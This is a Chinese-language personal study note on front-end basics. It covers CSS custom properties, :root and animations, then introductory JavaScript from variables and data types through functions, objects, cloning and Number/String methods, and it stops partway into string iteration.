**自定义属性**（有时候也被称作**CSS 变量**或者**级联变量**）是由 CSS 作者定义的，它包含的值可以在整个文档中重复使用。由自定义属性标记设定值（比如： **`--main-color: black;`**），由 var()函数来获取值（比如： `color: var(--main-color);`）复杂的网站都会有大量的 CSS 代码，通常也会有许多重复的值。举个例子，同样一个颜色值可能在成千上百个地方被使用到，如果这个值发生了变化，需要全局搜索并且一个一个替换（很麻烦哎～）。自定义属性在某个地方存储一个值，然后在其他许多地方引用它。另一个好处是语义化的标识。比如，`--main-text-color` 会比 `#00ff00` 更易理解，尤其是这个颜色值在其他上下文中也被使用到。自定义属性受级联的约束，并从其父级继承其值。

声明一个自定义属性，属性名需要以==两个减号（`--`）开始==，==属性值则可以是任何有效的 CSS 值==。和其他属性一样，==自定义属性也是写在规则集之内的==，如下：

```css
:root {
  --main-bg-color: brown;
}
```

==注意，规则集所指定的选择器定义了自定义属性的可见作用域。通常的最佳实践是定义在根伪类 **:root** 下，这样就可以在 HTML 文档的任何地方访问到它了==

------

补充：伪类（：root）

**`:root`** 这个 CSS **伪类**匹配文档树的==根元素==。对于 HTML 来说，**`:root`** 表示元素，除了优先级更高之外，与 `html` 选择器相同。

语法：

```css
:root {
  /* ... */
}
```

作用：声明全局CSS变量

在声明全局 CSS 变量时 **`:root`** 会很有用：

```css
:root {
  --main-color: hotpink;
  --pane-padding: 5px 42px;
}
```

------

使用教程：

我们从这个简单的 CSS 代码开始，它将相同的颜色应用在了不同 class 的元素上

```css
.one {
  color: white;
  background-color: brown;
  margin: 10px;
  width: 50px;
  height: 50px;
  display: inline-block;
}

.two {
  color: white;
  background-color: black;
  margin: 10px;
  width: 150px;
  height: 70px;
  display: inline-block;
}
.three {
  color: white;
  background-color: brown;
  margin: 10px;
  width: 75px;
}
.four {
  color: white;
  background-color: brown;
  margin: 10px;
  width: 100px;
}

.five {
  background-color: brown;
}

```

html代码如下：

```html
<div>
  <div class="one">1:</div>
  <div class="two">2: Text <span class="five">5 - more text</span></div>
  <input class="three">
  <textarea class="four">4: Lorem Ipsum</textarea>
</div>
```

效果如下：

![image-20230704202500415](./img/小米虫爬山路-img/image-20230704202500415.png)

注意到其中的元素都用到了相同的样式设置，就可以使用：root中定义的自定义元素

```css
:root {
  --main-bg-color: brown;
}

.one {
  color: white;
  background-color: var(--main-bg-color);
  margin: 10px;
  width: 50px;
  height: 50px;
  display: inline-block;
}

.two {
  color: white;
  background-color: black;
  margin: 10px;
  width: 150px;
  height: 70px;
  display: inline-block;
}
.three {
  color: white;
  background-color: var(--main-bg-color);
  margin: 10px;
  width: 75px;
}
.four {
  color: white;
  background-color: var(--main-bg-color);
  margin: 10px;
  width: 100px;
}

.five {
  background-color: var(--main-bg-color);
}
```



#### 2.8、动画

**CSS animations** 使得可以将从一个 CSS 样式配置转换到另一个 CSS 样式配置。动画包括两个部分：描述动画的样式规则和用于指定动画开始、结束以及中间点样式的关键帧。

创建动画序列，需要使用 `animation`属性或其子属性，该属性允许配置动画时间、时长以及其他动画细节，但该属性不能配置动画的实际表现，动画的实际表现是由 **`@keyframes`** 规则实现，具体情况参见**使用 keyframes 定义动画序列**小节部分。

[`animation`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation) 的子属性有：

- **[`animation-delay`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-delay)**

  设置延时，即从元素加载完成之后到动画序列开始执行的这段时间。

- **[`animation-direction`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-direction)**

  设置动画在每次运行完后是反向运行还是重新回到开始位置重复运行。

- **[`animation-duration`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-duration)**

  设置动画一个周期的时长。

- **[`animation-iteration-count`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-iteration-count)**

  设置动画重复次数，可以指定 infinite 无限次重复动画

- **[`animation-name`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-name)**

  指定由[`@keyframes`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/@keyframes)描述的关键帧名称。

- **[`animation-play-state`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-play-state)**

  允许暂停和恢复动画。

- **[`animation-timing-function`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-timing-function)**

  设置动画速度，即通过建立加速度曲线，设置动画在关键帧之间是如何变化。

- **[`animation-fill-mode`](https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-fill-mode)**

  指定动画执行前后如何为目标元素应用样式。

  话不多说css代码如下：

  ```css
  p {
    animation-duration: 3s;
    animation-name: slidein;
  }
  
  @keyframes slidein {
    from {
      margin-left: 100%;
      width: 300%;
    }
  
    to {
      margin-left: 0%;
      width: 100%;
    }
  }
  ```

  html代码如下：

  ```html
  <p>The Caterpillar and Alice looked at each other for some time in silence:
  at last the Caterpillar took the hookah out of its mouth, and addressed
  her in a languid, sleepy voice.</p>
  ```

  

## 二、JavaScript 

![image-20230707140653553](./img/小米虫爬山路-img/image-20230707140653553.png)

### 1、Java Script简介

*JavaScript* 最初被创建的目的是“使网页更生动”。

这种编程语言写出来的程序被称为 **脚本**。它们可以被直接写在网页的 HTML 中，在页面加载的时候自动执行。脚本被以纯文本的形式提供和执行。它们不需要特殊的准备或编译即可运行。

### 2、使用位置

js和css一样有三种使用方式

- **行内式：**代码写在标签内部。注意：一般在vue中会使用

- **内部式：**直接写在html文件中，用script标签包裹住。

  ==注意：一般把script标签写在</body>上方，应为浏览器在加载文件时，是从上往下加载，当加载到一些script后相应的html标签没有加载出来就会失效。==

- **外部式：**代码写在.js的文件中（和css一样），用过script标签里的属性src来指向.js文件路径调用相应的的js。

==注意：<script src="index.js"></script>中间无需写代码，就算写了代码，也会被忽略掉==

### 3 、JS输入输出语法与注释

目标:**能写出常见JavaScript输入输出语法**,输出和输入也可理解为人和计算机的交互，用户通过键盘、鼠标等向计算机输入信息，计算机处理后再展示结果给用户

**输出语法：**

语法1：语法会直接在浏览器内显示内容，==注意:如果输出的内容写的是标签，也会被解析成网页元素==

```javascript
document.write('内容')
```

语法2：控制台输出语法，程序员调试使用

```javascript
console.log('控制台打印')
```

**输入语法：**

prompt：显示信息要求用户输入文本。==点击确定返回文本==，点击取消或按下 Esc 键返回 `null`。

```javascript
prompt('请输入您的姓名'，default)
//default指定 input 框的初始值。点击
```

==作用:显示一个对话框，对话框中包含一条文字信息，用来提示用户输入文字==

**注释：js的注释与java一样**

### 4、现代模式，"use strict"

ES5 规范增加了新的语言特性并且修改了一些已经存在的特性。为了保证旧的功能能够使用，大部分的修改是默认不生效的。你需要一个特殊的指令 —— `"use strict"` 来明确地激活这些特性。

**use strict**

这个指令看上去像一个字符串 `"use strict"` 或者 `'use strict'`。当它处于脚本文件的顶部时，则整个脚本文件都将以“现代”模式进行工作。

比如：

```javascript
"use strict";

// 代码以现代模式工作
...
```

==注意：**use strict**必须出现在最顶部，否则严格模式可能无法启用。只有注释可以出现在 "use strict" 的上面。一旦开启严格模式后就无法取消==

### 5、JS变量与常量

#### 5.1 变量

**变量是数据的“命名存储”。**在 JavaScript 中创建一个变量，我们需要用到 `let` 关键字。

下面的语句创建（也可以称为 **声明** 或者 **定义**）了一个名称为 “message” 的变量：

```javascript
let message;
//现在，我们可以通过赋值运算符 = 为变量添加一些数据：
let message;
message = 'Hello'; // 将字符串 'Hello' 保存在名为 message 的变量中
//也可以在一行中声明多个变量：
let user = 'John', age = 25, message = 'Hello';
//一些程序员采用下面的形式书写多个变量：
let user = 'John',
  age = 25,
  message = 'Hello';
```

在一些老版本中也有另一种声明==关键字var==

var和let的区别：



==注意：**声明两次会触发 error**，一个变量应该只被声明一次。，对同一个变量进行重复声明会触发 error==

------

#### 5.2 变量命名规则

规则：

1. 变量名称**必须仅包含字母、数字、符号 `$` 和 `_`。**
2. 首字符必须**非数字**。

JavaScript和java的命名规则相同==驼峰命名法。==命名允许非英文字母，但不推荐。

#### 5.3 常量

声明一个常数（不变）变量，可以使用 `const` 而非 `let`：

```javascript
const myBirthday = '18.04.1982';
```

使用 `const` 声明的变量称为“常量”。它们不能被修改，如果你尝试修改就会发现报错：

也和java一样常量命名推荐使用大写字母和_来命名。



### 6、数据类型 类型的转换

在 JavaScript 中有 **8 种基本的数据类型**（译注：**7 种原始类型**和 **1 种引用类型**）

再JS中允许**动态数据类型**，例如，一个变量可以在前一刻是个字符串，下一刻就存储一个数字。

#### 6.1 Number类型

***number* 类型**代表整数和浮点数。除了常规数外还包括所谓的“特殊数值（“special numeric values”）”也属于这种类型：`Infinity`（无穷大）、`-Infinity`（（无穷小）） 和 `NaN`（计算错误）。

```javascript
let n = 123;
n = 12.345;
alert( 1 / 0 ); // Infinity
alert( "not a number" / 2 ); // NaN，这样的除法是错误的
//NaN 是粘性的。任何对 NaN 的进一步数学运算都会返回 NaN：
alert( NaN + 1 ); // NaN
alert( 3 * NaN ); // NaN
```

#### 6.2 BigInt类型

Number类型的数不能超过安全整数范围 `±(253-1)` ，超出就会出现精度问题。

`BigInt` 类型是最近被添加到 JavaScript 语言中的，用于表示任意长度的整数。可以通过将 `n` 附加到整数字段的末尾来创建 `BigInt` 值。

```javascript
// 尾部的 "n" 表示这是一个 BigInt 类型
const bigInt = 1234567890123456789012345678901234567890n;
```

#### 6.3 String类型

JavaScript 中的字符串必须被括在引号里。

```javascript
let str = "Hello";
let str2 = 'Single quotes are ok too';
let phrase = `can embed another ${str}`;
```

在 JavaScript 中，有三种包含字符串的方式。

1. 双引号：`"Hello"`.
2. 单引号：`'Hello'`.
3. 反引号：``Hello``.

双引号和单引号都是“简单”引用，在 JavaScript 中两者几乎没有什么差别。

反引号是 **功能扩展** 引号。它们允许我们通过将变量和表达式包装在 `${…}` 中，来将它们==嵌入到字符串==中。例如：

```javascript
let name = "John";

// 嵌入一个变量
alert( `Hello, ${name}!` ); // Hello, John!

// 嵌入一个表达式
alert( `the result is ${1 + 2}` ); // the result is 3
```

#### 6.4 Boolean类型

**类型值：true和false**，基本用法和java相同

#### 6.5 数组类型

创建一个空数组有两种语法：

```javascript
let arr = new Array();
let arr = [];
```

绝大多数情况下使用的都是第二种语法。我们可以在方括号中添加初始元素：

```javascript
let fruits = ["Apple", "Orange", "Plum"];
```

也可以用 `alert` 来显示整个数组:

```javascript
alert( fruits ); // Apple,Orange,Plum
```

数组可以存储任何类型的元素。

```javascript
// 混合值
let arr = [ 'Apple', { name: 'John' }, true, function() { alert('hello'); } ];

// 获取索引为 1 的对象然后显示它的 name
alert( arr[1].name ); // John

// 获取索引为 3 的函数并执行
arr[3](); // hello
```



#### 6.6 null和undefined值

==null:==**特殊的 `null` 值不属于上述任何一种类型。它构成了一个独立的类型，只包含 `null` 值**

==undefined:==`undefined` 的含义是 `未被赋值`。如果一个变量已被声明，但未被赋值，那么它的值就是 `undefined`

==注意：这两个类型没有任何方法。==

#### 6.7 Object类型和Symbol类型

==Object==:`object` 类型是一个特殊的类型。其他所有的数据类型都被称为“原始类型”，因为它们的值只包含一个单独的内容（字符串、数字或者其他）。相反，`object` 则用于储存数据集合和更复杂的实体。（其实与java中的类有些相似）

==Symbol:==`symbol` 类型用于创建对象的唯一标识符。我们在这里提到 `symbol` 类型是为了完整性

#### 6.8 typeof运算符

`typeof` 运算符返回参数的类型。当我们想要分别处理不同类型值的时候，或者想快速进行数据类型检验时，非常有用。

对 `typeof x` 的调用会以**字符串的形式**返回数据类型：

```javascript
typeof undefined // 返回"undefined"

typeof 0 // "number"

typeof 10n // "bigint"

typeof true // "boolean"

typeof "foo" // "string"

typeof Symbol("id") // "symbol"

typeof Math // "object"  (1)

typeof null // "object"  (2)

typeof alert // "function"  (3)
```

#### 6.9 类型转换

在js中的各种变量在声明的时候没有声明是哪种类型，当我们调用一些函数时返回值不是我们想要得到的类型时就会出错。

```javascript
let num = prompt("请输入数字")；
//这样获得的num时String类型的数字，但是我想要num是数字，所以要进行数字转换如下
let num = +prompt("请输入数字")；
```

##### **二元运算符 + 连接字符串**

通常，加号 `+` 用于求和。但是如果加号 `+` 被应用于字符串，它将合并（连接）各个字符串：

```javascript
let s = "my" + "string";
alert(s); // mystring
//注意：只要任意一个运算元是字符串，那么另一个运算元也将被转化为字符串。
alert(2 + 2 + '1' ); // "41"，不是 "221"
//在这里，运算符是按顺序工作。第一个 + 将两个数字相加，所以返回 4，然后下一个 + 将字符串 1 加入其中，所以就是 4 + '1' = '41'。
```

**注意：二元 `+` 是唯一一个以这种方式支持字符串的运算符。其他算术运算符只对数字起作用，并且总是将其运算元转换为数字。即其他的运算符号都会把非数字类型转化成数字类型。**

##### **数字转化，一元运算符 +**

一元运算符加号，或者说，加号 `+` 应用于单个值，对数字没有任何作用。但是如果运算元不是数字，加号 `+` 则会将其转化为数字。

```javascript
// 对数字无效
let x = 1;
alert( +x ); // 1

let y = -2;
alert( +y ); // -2

// 转化非数字
alert( +true ); // 1
alert( +"" );   // 0
```

##### 强制转换

语法 数据类型(值);

```javascript
let str = '520';

let num = Number(str);

alert(num);//显示数字520
```

==注意：在数据类型转换时要看看是否能被转换。==

```javascript
let str = '你好！'；

let num = Number(str);//这里会出错NaN
```



### 7、逻辑运算符

JavaScript 中有四个逻辑运算符：`||`（或），`&&`（与），`!`（非），`??`（空值合并运算符）

#### 7.1 一般逻辑符号

JS中的逻辑运算符与java中的一大区别就是运算符不一定返回布尔值，如下

**寻找第一个真值（||）**：

```javascript
result = value1 || value2 || value3;
```

或运算符 `||` 做了如下的事情：

- 从左到右依次计算操作数。
- 处理每一个操作数时，都将其转化为布尔值。如果结果是 `true`，就停止计算，返回这个操作数的初始值。
- 如果所有的操作数都被计算过（也就是，转换结果都是 `false`），则返回最后一个操作数。

返回的值是操作数的初始形式，不会做布尔转换。换句话说，==一个或运算||的链，将返回第一个真值，如果不存在真值，就返回该链的最后一个值。==

**寻找第一个假值(&&)**:

```javascript
result = value1 && value2 && value3;
```

与运算 `&&` 做了如下的事：

- 从左到右依次计算操作数。
- 在处理每一个操作数时，都将其转化为布尔值。如果结果是 `false`，就停止计算，并返回这个操作数的初始值。
- 如果所有的操作数都被计算过（例如都是真值），则返回最后一个操作数。

换句话说，与运算返回第一个假值，如果没有假值就返回最后一个值。==上面的规则和或运算很像。区别就是与运算返回第一个假值，而或运算返回第一个真值。==

**可以用逻辑符号来进行类似if的操作：（绝对不推荐）**

```javascript
let x = 1;
if (x > 0) alert( 'Greater than zero!' );
//就可以写成：
let x = 1;
(x > 0) && alert( 'Greater than zero!' );
//&& 右边的代码只有运算抵达到那里才能被执行。也就是，当且仅当 (x > 0) 为真。会执行后面的内容
```

#### 7.2 空值合并运算符'??'

空值合并运算符（nullish coalescing operator）的写法为两个问号 `??`。

==注意：这是新增的特性，有些浏览器可能没有。==

由于它对待 `null` 和 `undefined` 的方式类似，所以在本文中我们将使用一个特殊的术语对其进行表示。为简洁起见，当一个值既不是 `null` 也不是 `undefined` 时，==我们将其称为“已定义的（defined）”==。

`a ?? b` 的结果是：

- 如果 `a` 是已定义的，则结果为 `a`，
- 如果 `a` 不是已定义的，则结果为 `b`。

换句话说，如果第一个参数不是 `null/undefined`，==则 ??返回第一个参数==。否则，==返回第二个参数。==空值合并运算符并不是什么全新的东西。==它只是一种获得两者中的第一个“已定义的”值的不错的语法。==



### 8、函数

我们经常需要在脚本的许多地方执行很相似的操作。

例如，当访问者登录、注销或者在其他地方时，我们需要显示一条好看的信息。

函数是程序的主要“构建模块”。函数使该段代码可以被调用很多次，而不需要写重复的代码。

我们已经看到了内建函数的示例，如 `alert(message)`、`prompt(message, default)` 和 `confirm(question)`。但我们也可以创建自己的函数。

#### 8.1 函数声明

使用 **函数声明** 创建函数。

看起来就像这样：

```javascript
function showMessage() {
  alert( 'Hello everyone!' );
}
```

`function` 关键字首先出现，然后是 **函数名**，然后是括号之间的 **参数** 列表（用逗号分隔，在上述示例中为空，我们将在接下来的示例中看到），最后是花括号之间的代码（即“函数体”）。

```javascript
function name(parameter1, parameter2, ... parameterN) {
  ...body...
}
```

**函数里面的变量是局部变量，函数可以访问函数外的全部变量以及修改**

#### 8.2 默认值

在调用函数时，不提供参数，相应的参数会变成`undefined`(**已声明未赋值**)

我们可以使用 `=` 为函数声明中的参数指定所谓的“**默认**”（如果对应参数的值未被传递则使用）值：

```javascript
function showMessage(from, text = "no text given") {
  alert( from + ": " + text );
}

showMessage("Ann"); // 输出Ann: no text given
```

这样操作就像是再函数里**添加一个条件**来让参数发生初始变化

```javascript
function showMessage(text) {
  // ...

  if (text === undefined) { // 如果参数未被传递进来
    text = 'empty message';
  }

  alert(text);
}

showMessage(); // empty message
```

#### 8.3 函数表达式

==函数不是“神奇的语言结构”，而是一种特殊的值。==

原本创建函数的语法**函数声明：**

```javascript
function sayHi() {
  alert( "Hello" );
}
```

另一种创建函数的语法称为 **函数表达式**。它允许我们在任何表达式的中间创建一个新函数。

```javascript
let sayHi = function() {
  alert( "Hello" );
};
```

在这里我们可以看到变量 `sayHi` 得到了一个值，新函数 `function() { alert("Hello"); }`。由于函数创建发生在赋值表达式的上下文中（在 `=` 的右侧），因此这是一个 **函数表达式**。请注意，`function` 关键字后面没有函数名。函数表达式允许省略函数名。这里我们立即将它赋值给变量，所以上面的两个代码示例的含义是一样的：“==创建一个函数并将其放入变量 satHi中==”。**其实这里可以把`sayHi`看作函数名**，当我们使用`sayHi()`时就会调用函数；

==注意：函数是一个值；==

```javascript
function sayHi() {
  alert( "Hello" );
}

alert( sayHi ); // 显示函数代码
```

函数是一个值，所以我们可以把它当成值对待。上面代码显示了一段字符串值，即函数的源码。的确，在某种意义上说一个函数是一个特殊值，==我们可以像sayHi()这样调用它==。但它依然是一个值，所以我们可以像使用其他类型的值一样使用它。

#### 8.4 箭头函数

目的:引入箭头函数的目的是更简短的函数写法并且不绑定this，箭头函数的语法比函数表达式更简洁。

使用场景:箭头函数更适用于那些本来==需要匿名函数的地方==

##### 8.4.1 单行箭头函数

创建函数还有另外一种非常简单的语法，并且这种方法通常比函数表达式更好。它被称为“箭头函数”，因为它看起来像这样：

```javascript
let func = (arg1, arg2, ..., argN) => expression;
//这里创建了一个函数 func，它接受参数 arg1..argN，然后使用参数对右侧的 expression 求值并返回其结果。
```

让我们来看一个具体的例子：

```javascript
let sum = (a, b) => a + b;

/* 这个箭头函数是下面这个函数的更短的版本：

let sum = function(a, b) {
  return a + b;
};
*/

alert( sum(1, 2) ); // 3
```

可以看到 `(a, b) => a + b` 表示一个函数接受两个名为 `a` 和 `b` 的参数。在执行时，它将对表达式 `a + b` 求值，并返回计算结果。

```javascript
//如果我们只有一个参数，还可以省略掉参数外的圆括号，使代码更短。
let double = n => n * 2;
// 差不多等同于：let double = function(n) { return n * 2 }
alert( double(3) ); // 6

//如果没有参数，括号则是空的（但括号必须保留）：
let sayHi = () => alert("Hello!");
sayHi();
```

##### 8.4.2 多行的箭头函数

到目前为止，我们看到的箭头函数非常简单。它们从 `=>` 的左侧获取参数，计算并返回右侧表达式的计算结果。有时我们需要更复杂一点的函数，比如带有多行的表达式或语句。在这种情况下，我们可以使用花括号将它们括起来。主要区别在于，用花括号括起来之后，需要包含 `return` 才能返回值（就像常规函数一样）。

```javascript
let sum = (a, b) => {  // 花括号表示开始一个多行函数
  let result = a + b;
  return result; // 如果我们使用了花括号，那么我们需要一个显式的 “return”
};//和函数表达式相似
alert( sum(1, 2) ); // 3
```

### 9、对象

#### 9.1 对象

对象用来存储键值对和更复杂的实体。在 JavaScript 中，对象几乎渗透到了这门编程语言的方方面面。所以，在我们深入理解这门语言之前，必须先理解对象。

我们可以通过使用带有可选 **属性列表** 的花括号 `{…}` 来创建对象。一个属性就是一个键值对（“key: value”），其中键（`key`）是一个字符串（也叫做属性名），值（`value`）可以是任何值。

我们可以用下面两种语法中的任一种来创建一个空的对象（“空柜子”）：

```javascript
let user = new Object(); // “构造函数” 的语法
let user = {};  // “字面量” 的语法
//通常，我们用花括号。这种方式我们叫做 字面量。
```

我们可以在创建对象的时候，立即将一些属性以键值对的形式放到 `{...}` 中。

```javascript
let user = {     // 一个对象
  name: "John",  // 键 "name"，值 "John"
  age: 30 ,      // 键 "age"，值 30
};
/*属性有键（或者也可以叫做“名字”或“标识符”），位于冒号 ":" 的前面，值在冒号的右边。
在 user 对象中，有两个属性：
第一个的键是 "name"，值是 "John"。
第二个的键是 "age"，值是 30。*/
```

#### 9.2 属性

点访问符（.）

```javascript
// 读取文件的属性：
alert( user.name ); // John
alert( user.age ); // 30
```

对象的属性是可以随意添加的：

```javascript
user.isAdmin = true;
//这样就对user对象添加了一个布尔类型了属性值
```

对象的属性是也可以随意删除：我们可以用 `delete` 操作符移除属性

```javascript
delete user.age;
```

#### 9.3 方括号

对于多词属性，点操作就不能用了：

```javascript
// 这将提示有语法错误
user.likes birds = true
```

JavaScript 理解不了。它认为我们在处理 `user.likes`，然后在遇到意外的 `birds` 时给出了语法错误。

点符号要求 `key` 是有效的变量标识符。这意味着：不包含空格，不以数字开头，也不包含特殊字符（允许使用 `$` 和 `_`）。

有另一种方法，就是使用方括号，可用于任何字符串：

```javascript
let user = {};

// 设置
user["likes birds"] = true;

// 读取
alert(user["likes birds"]); // true

// 删除
delete user["likes birds"];
```

现在一切都可行了。请注意方括号中的**字符串要放在引号中，单引号或双引号都可以**。

方括号同样提供了一种可以通过任意表达式来获取属性名的方式 —— 与文本字符串不同 —— 例如下面的变量：

```javascript
let key = "likes birds";

// 跟 user["likes birds"] = true; 一样
user[key] = true;
```



#### 9.4 计算属性

当创建一个对象时，我们可以在对象字面量中使用方括号。这叫做 **计算属性**。

```javascript
let fruit = prompt("Which fruit to buy?", "apple");

let bag = {
  [fruit]: 5, // 属性名是从 fruit 变量中得到的
};

alert( bag.apple ); // 5 如果 fruit="apple"
```

计算属性的含义很简单：`[fruit]` 含义是属性名应该从 `fruit` 变量中获取。

所以，如果一个用户输入 `"apple"`，`bag` 将变为 `{apple: 5}`。同理如果用户输入`"banana"`,`bag`就会变为{`banana：5`}。

#### 9.5 in操作符

相比于其他语言，JavaScript 的对象有一个需要注意的特性：能够被访问任何属性。==即使属性不存在也不会报错！==

读取不存在的属性只会得到 `undefined`。所以我们可以很容易地判断一个属性是否存在：

```javascript
let user = {};

alert( user.noSuchProperty === undefined ); // true 意思是没有这个属性
```

这里还有一个特别的，检查属性是否存在的操作符 `"in"`。

语法是：

```javascript
"key" in object
```

请注意，`in` 的左边必须是 **属性名**。通常是一个带引号的字符串。

==如果我们省略引号，就意味着左边是一个变量，它应该包含要判断的实际属性名。==

```javascript
let user = { age: 30 };

let key = "age";
alert( key in user ); // true，属性 "age" 存在
```

#### 9.6 历遍对象属性

为了遍历一个对象的所有键（key），可以使用一个特殊形式的循环：`for..in`。这跟我们在前面学到的 `for(;;)` 循环是完全不一样的东西。

例如，让我们列出 `user` 所有的属性：

```javascript
let user = {
  name: "John",
  age: 30,
  isAdmin: true
};

for (let key in user) {
  // keys
  alert( key );  // name, age, isAdmin
  // 属性键的值
  alert( user[key] ); // John, 30, true
}
```

注意，所有的 “for” 结构体都允许我们在循环中定义变量，像这里的 `let key`。

同样，我们可以用其他属性名来替代 `key`。例如 `"for(let prop in obj)"` 也很常用。

#### 9.7 对象的引用

对象与原始类型的根本区别之一是，对象是“通过引用”存储和复制的，而原始类型：字符串、数字、布尔值等 —— 总是“作为一个整体”复制。

**赋值了对象的变量存储的不是对象本身，而是该对象“在内存中的地址” —— 换句话说就是对该对象的“引用”。**这和java的对象是一样的。

```javascript
let user = {
  name: "John"
};
```

这是它实际存储在内存中的方式：

![image-20230707084048009](./img/小米虫爬山路-img/image-20230707084048009.png)

#### 9.8 对象克隆

##### 浅克隆

对象可以复制但是复制的时对象的引用，这样就有两个引用指向一个相同的对象了，但是我们想要两个引用不同而内容相同又该如何做。

我们可以使用for..in历遍对象的属性：

```javascript
let user = {
  name: "John",
  age: 30
};

let clone = {}; // 新的空对象

// 将 user 中所有的属性拷贝到其中
for (let key in user) {
  clone[key] = user[key];
}

// 现在 clone 是带有相同内容的完全独立的对象
clone.name = "Pete"; // 改变了其中的数据

alert( user.name ); // 原来的对象中的 name 属性依然是 John
```

我们也可以使用 `Object.assign` 方法来达成同样的效果。

```javascript
Object.assign(dest, [src1, src2, src3...])
```

- 第一个参数 `dest` 是指目标对象。
- 更后面的参数 `src1, ..., srcN`（可按需传递多个参数）是源对象。
- 该方法将所有源对象的属性拷贝到目标对象 `dest` 中。换句话说，从第二个开始的所有参数的属性都被拷贝到第一个参数的对象中。
- 调用结果返回 `dest`。

```javascript
let user = { name: "John" };

let permissions1 = { canView: true };
let permissions2 = { canEdit: true };

// 将 permissions1 和 permissions2 中的所有属性都拷贝到 user 中
Object.assign(user, permissions1, permissions2);

// 现在 user = { name: "John", canView: true, canEdit: true }
```

==注意：使用 const 声明的对象也是可以被修改的，因为const声明的常量是地址为常量，地址指向的对象属性可以改变==

##### 深克隆

到现在为止，我们都假设 `user` 的所有属性均为原始类型。==但属性可以是对其他对象的引用==。

```javascript
let user = {
  name: "John",
  sizes: {
    height: 182,
    width: 50
  }
};

alert( user.sizes.height ); // 182
```

现在这样拷贝 `clone.sizes = user.sizes` 已经不足够了，因为 `user.sizes` 是个对象，它会以引用形式被拷贝。因此 `clone` 和 `user` 会共用一个 sizes,为了解决这个问题，并让 `user` 和 `clone` 成为两个真正独立的对象，我们应该使用一个拷贝循环来检查 `user[key]` 的每个值，如果它是一个对象，那么也复制它的结构。这就是所谓的“==深拷贝==”。

#### 9.9 打印对象

大多数浏览器在其开发者工具中都支持这两个命令：`console.log` 和 `console.dir`。它们将它们的参数输出到控制台中。对于 JavaScript 对象，这些命令通常做的是相同的事。

但对于 DOM 元素，它们是不同的：

- `console.log(elem)` 显示元素的 DOM 树。
- `console.dir(elem)` 将元素显示为 DOM 对象，非常适合探索其属性。

你可以在 `document.body` 上尝试一下。

所以我们常使用`console.dir(elem)`进行输出对象

### 10、原始数据方法

以下是 JavaScript 创建者面临的悖论：

- 人们可能想对诸如字符串或数字之类的原始类型执行很多操作。最好使用方法来访问它们。
- 原始类型必须尽可能的简单轻量。

而解决方案看起来多少有点尴尬，如下：

1. 原始类型仍然是原始的。与预期相同，提供单个值
2. JavaScript 允许访问字符串，数字，布尔值和 symbol 的方法和属性。
3. ==为了使它们起作用，创建了提供额外功能的特殊“对象包装器”，使用后即被销毁。==

“对象包装器”对于每种原始类型都是不同的，它们被称为 `String`、`Number`、`Boolean`、`Symbol` 和 `BigInt`。因此，它们提供了不同的方法。

#### 10.1 Number类型的方法

##### num.toFixed(n) 

将数字舍入到给定的精度

```javascript
let n = 1.23456;

alert( n.toFixed(2) ); // 1.23
```

==注意：只是舍入小数点后面的位数。==

##### toString(base)

返回在给定 `base` 进制数字系统中 `num` 的字符串表示形式。

```javascript
let num = 255;

alert( num.toString(16) );  // ff
alert( num.toString(2) );   // 11111111
```

`base` 的范围可以从 `2` 到 `36`。默认情况下是 `10`。

常见的用例如下：

- **base=16** 用于十六进制颜色，字符编码等，数字可以是 `0..9` 或 `A..F`。
- **base=2** 主要用于调试按位操作，数字可以是 `0` 或 `1`。
- **base=36** 是最大进制，数字可以是 `0..9` 或 `A..Z`。所有拉丁字母都被用于了表示数字。对于 `36` 进制来说，一个有趣且有用的例子是，当我们需要将一个较长的数字标识符转换成较短的时候，例如做一个短的 URL。可以简单地使用基数为 `36` 的数字系统表示

##### isFinite 和 isNaN

还记得这两个特殊的数值吗？

- `Infinity`（和 `-Infinity`）是一个特殊的数值，比任何数值都大（小）。

- `NaN` 代表一个 error。

  

它们属于 `number` 类型，但不是“普通”数字，因此，这里有用于检查它们的特殊函数：

`isNaN(value)` 将其参数转换为数字，然后测试它是否为 `NaN`：

```javascript
alert( isNaN(NaN) ); // true
alert( isNaN("str") ); // true
```

但是我们需要这个函数吗？我们不能只使用 `=== NaN` 比较吗？很不幸，这不行。值 “NaN” 是独一无二的，它不等于任何东西，包括它自身：

```javascript
alert( NaN === NaN ); // false
```

`isFinite(value)` 将其参数转换为数字，如果是常规数字而不是 `NaN/Infinity/-Infinity`，则返回 `true`：

```javascript
alert( isFinite("15") ); // true
alert( isFinite("str") ); // false，因为是一个特殊的值：NaN
alert( isFinite(Infinity) ); // false，因为是一个特殊的值：Infinity
```

##### parseInt 和 parseFloat

但在现实生活中，我们经常会有带有单位的值，例如 CSS 中的 `"100px"` 或 `"12pt"`。并且，在很多国家，货币符号是紧随金额之后的，所以我们有 `"19€"`，并希望从中提取出一个数值。

这就是 `parseInt` 和 `parseFloat` 的作用。

它们可以从字符串中“读取”数字，直到无法读取为止。如果发生 error，则返回收集到的数字。函数 `parseInt` 返回一个整数，而 `parseFloat` 返回一个浮点数：

```javascript
alert( parseInt('100px') ); // 100
alert( parseFloat('12.5em') ); // 12.5

alert( parseInt('12.3') ); // 12，只有整数部分被返回了
alert( parseFloat('12.3.4') ); // 12.3，在第二个点出停止了读取
```

某些情况下，`parseInt/parseFloat` 会返回 `NaN`。当没有数字可读时会发生这种情况：

```javascript
alert( parseInt('a123') ); // NaN，第一个符号停止了读取
```

`parseInt()` 函数具有可选的第二个参数。它指定了数字系统的基数，因此 `parseInt` 还可以解析十六进制数字、二进制数字等的字符串：

```javascript
alert( parseInt('0xff', 16) ); // 255
alert( parseInt('ff', 16) ); // 255，没有 0x 仍然有效

alert( parseInt('2n9c', 36) ); // 123456
```

#### 10.2 String类型的方法

##### 访问字符

要获取在 `pos` 位置的一个字符，可以使用方括号 `[pos]` 或者调用 str.charAt(pos)方法。第一个字符从零位置开始：

```javascript
let str = `Hello`;

// 第一个字符
alert( str[0] ); // H
alert( str.charAt(0) ); // H

// 最后一个字符
alert( str[str.length - 1] ); // o
```

我们也可以使用 `for..of` 遍历字符：

